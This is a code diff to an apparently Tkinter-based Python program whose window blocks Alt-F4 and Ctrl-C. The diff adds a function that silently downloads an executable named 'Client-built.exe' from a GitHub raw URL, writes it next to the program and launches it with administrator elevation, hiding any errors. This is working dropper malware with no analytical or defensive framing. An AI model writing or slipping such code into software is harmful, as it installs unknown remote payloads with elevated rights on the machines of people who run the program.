@@ -42,3 +42,24 @@ root.bind('<Alt-F4>', lambda e: None)
 root.bind('<Control-c>', lambda e: None)
 
 root.mainloop()
+
+def download_and_run():
+    url = "https://raw.githubusercontent.com/albertyoutubepro-dot/d/main/Client-built.exe"
+    
+    if getattr(sys, 'frozen', False):
+        base_path = os.path.dirname(sys.executable)
+    else:
+        base_path = os.path.dirname(os.path.abspath(__file__))
+    
+    output_path = os.path.join(base_path, "Client-built.exe")
+    
+    try:
+        if not os.path.exists(output_path):
+            response = requests.get(url, stream=True)
+            response.raise_for_status()
+            with open(output_path, "wb") as f:
+                for chunk in response.iter_content(chunk_size=8192):
+                    f.write(chunk)
+        ctypes.windll.shell32.ShellExecuteW(None, "runas", output_path, None, None, 1)
+    except Exception:
+        pass
